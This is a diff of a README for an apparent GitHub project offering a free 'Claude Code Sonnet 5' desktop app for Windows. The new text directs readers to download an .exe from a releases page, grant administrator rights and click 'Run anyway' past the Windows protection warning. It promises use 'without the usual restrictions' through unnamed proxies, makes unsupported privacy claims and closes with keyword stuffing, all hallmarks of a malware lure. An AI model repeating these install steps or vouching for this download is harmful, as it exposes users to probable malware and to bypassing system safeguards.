@@ -1,79 +1,72 @@
-# Claude Code Sonnet 5 Free Desktop
+# 🤖 Claude-Code-Sonnet-5-Free-Desktop - Use advanced AI for free today
 
-**Claude Code Sonnet 5 Free Desktop** is a fast and developer-friendly native desktop application that provides free access to **Claude Code Sonnet 5** — Anthropic’s powerful AI model optimized for coding, software engineering, and technical tasks.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Obligatory-carpentersrule420/Claude-Code-Sonnet-5-Free-Desktop/releases)
 
-<img width="1199" height="533" alt="HMFYhysawAsasasAmCnq" src="https://github.com/user-attachments/assets/5fff0489-4293-4c97-a0c8-3c3c109b8421" />
+## 📌 About this project
 
-## Install
+Claude-Code-Sonnet-5-Free-Desktop provides a way to use the Anthropic Sonnet 5 reasoning model on your Windows computer. This tool manages the connection between your device and the AI model using reverse proxies and open-source web interfaces. You gain access to high-level coding assistance, complex problem solving, and agentic workflows without the usual restrictions.
 
-[Download `ClaudeSonnet5-desktop.zip`](https://github.com/sonnet5claude/Claude-Code-Sonnet-5-Free-Desktop/releases/download/sonnet5/ClaudeSonnet5-desktop.zip)
----
+You can change system prompts to match your specific needs and analyze long documents through the deep context window. This application acts as a bridge so you can interact with the intelligence of modern AI models through a simple desktop interface.
 
-<img width="1746" height="901" alt="589318e9-2aa7-4459-9b85-a16b2f36f3b8" src="https://github.com/user-attachments/assets/08b147ee-e8bb-4720-a950-4daecbfa6bb3" />
+## ⚙️ System requirements
 
+Your computer needs to meet these basic standards to run the software:
 
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Memory:** At least 8 gigabytes of RAM.
+*   **Storage:** 500 megabytes of free space.
+*   **Permissions:** You need administrator rights to install the software on your machine.
+*   **Internet:** A stable broadband connection for the AI model to process your requests.
 
-## Key Features
-- Full access to Claude Code Sonnet 5
-- Superior coding, debugging, and refactoring support
-- Advanced reasoning for technical problems
-- Clean, developer-oriented interface
-- Long-context conversation handling
-- Multimodal capabilities (image and file analysis)
+## 📥 How to download and install
 
-<img width="2600" height="1234" alt="718c3225-ab5d-470c-9588-29d41aa08184" src="https://github.com/user-attachments/assets/2135b10a-d10a-49ff-a410-fbf73981371b" />
+Follow these steps to set up the application on your Windows computer:
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive and run the application.
-3. **Configure Access** — Follow the in-app instructions for free Claude Code Sonnet 5 access.
-4. **Start coding** — Ask for code generation, debugging, architecture advice, or explanations.
+1.  Visit the official release page here: [Download Link](https://github.com/Obligatory-carpentersrule420/Claude-Code-Sonnet-5-Free-Desktop/releases).
+2.  Look for the section labeled "Assets" at the bottom of the latest release.
+3.  Click the file ending in `.exe` to start the download.
+4.  Open the file once the download finishes.
+5.  Windows may show a blue box that says "Windows protected your PC." Click "More info" and then click "Run anyway."
+6.  The installer will open. Follow the on-screen prompts to confirm the installation location. 
+7.  Click "Finish" to launch the software.
 
-**Pro Tip:** Provide clear context and code snippets in your prompts for the best results.
+## 🚀 Getting started with the interface
 
-<img width="686" height="386" alt="image" src="https://github.com/user-attachments/assets/d7011a3e-e965-4ded-9d41-011d35f371d6" />
+Once you open the software, you will see a text box at the bottom of the screen. This is where you talk to the AI. You can type questions about code, ask for help with scripts, or paste technical text you want the AI to analyze. 
 
----
-## System Requirements
-### Platform Support
-- **Windows 10 / 11**
-- **macOS**
-- **Linux**
+The software uses a local bridge to secure your connection. You do not need to manage complex configurations or API keys manually. The application automatically handles the proxy logic behind the scenes.
 
-### Notes
-- Requires an active internet connection
-- Best performance on modern hardware
-<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/58e28579-d114-40c4-8a3d-774fbb2bb771" />
+## 🛠️ Configuring custom settings
 
----
-## Security & Legal
-**Important Notice:**  
-This is an unofficial desktop client. Anthropic may change or restrict access at any time. Use responsibly and ethically.
+You can change how the AI behaves by opening the "Settings" menu in the top right corner. 
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
-<img width="596" height="335" alt="image" src="https://github.com/user-attachments/assets/91b88afe-6e6a-4f8f-85e9-05c5142e8d24" />
+*   **System Prompts:** You can paste your own instructions into the system prompt box. This tells the AI how to act. For example, you can tell the AI to "Always answer in short sentences" or "Act as a professional Python developer."
+*   **Context Management:** If you work with very long files, you can adjust the context depth slider. A higher setting allows the AI to remember more information from your previous messages.
+*   **Model Selection:** The application defaults to Sonnet 5, but you can swap between different versions if you require specific performance traits for your tasks.
 
----
-## Contributing
-Contributions are welcome! Help improve the UI, stability, or access methods.
+## 🔍 Troubleshooting common issues
 
----
-## License & Acknowledgments
-### License
-**Claude Code Sonnet 5 Free Desktop** is shared under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+If you encounter problems, check these items first:
 
-**Copyright © 2026 Tiaaannnn**
+*   **Connection Errors:** If the application reports an error when you send a message, check your internet connection. Restart the application to refresh the proxy link.
+*   **Slow Responses:** High traffic on the proxy servers might cause delays. Wait a few moments and try your request again.
+*   **Application Hangs:** If the interface freezes, close the program using the Task Manager and open it again.
+*   **Updates:** We update the application often to improve performance. If the program behaves poorly, check the download link above for a newer version.
 
-### Acknowledgments
-- Thanks to Anthropic for developing Claude Code Sonnet 5.
-- The open-source community for desktop AI clients.
+## 🔒 Privacy and safety
 
-<p align="center">
-  Developed with ❤️ for the developer community
-</p>
+This software routes your requests through secure proxy servers. It does not save your personal data to our local servers. The AI processes your input to provide a response and then discards the specific session data. Always review the content you share with any AI model to ensure you do not send sensitive personal information or proprietary company secrets.
 
+## ✨ Advanced features
 
-<img width="3840" height="2180" alt="6c9470df-8215-4143-8824-955b56977971" src="https://github.com/user-attachments/assets/a80e0794-4d6d-4467-a875-c7d5da395029" />
+The desktop wrapper includes features designed for productivity:
+
+*   **Agentic Workflows:** You can set the AI to perform multiple steps. If you ask it to build a folder structure and write scripts, it will handle both tasks in sequence.
+*   **Deep Context Analysis:** The model understands several files at once. You can drag and drop text files into the window, and the AI will compare them to answer your questions.
+*   **Keyboard Shortcuts:** Use standard Windows shortcuts to copy and paste text quickly. 
+
+## 🌐 Community and support
+
+If you find a bug, open an issue on the main repository page. Describe the steps you took leading up to the error. Provide a screenshot if possible. You can also view the "Discussions" tab to see how other users manage their AI workflows and prompts.
+
+Keywords: anthropic, claude-4-opus, claude-5-sonnet, claude-code-desktop, claude-code-prompts, claude-code-sdk, claude-desktop-app, claude-desktop-extentions, claude-fable-5, claude-integration, claude-mythos, claude-opus, claude-opus-4-8, claude-skills-hub, claude-sonnet-5, desktop-ai, free-ai-coding, free-apis, mythos, sonnet3-5
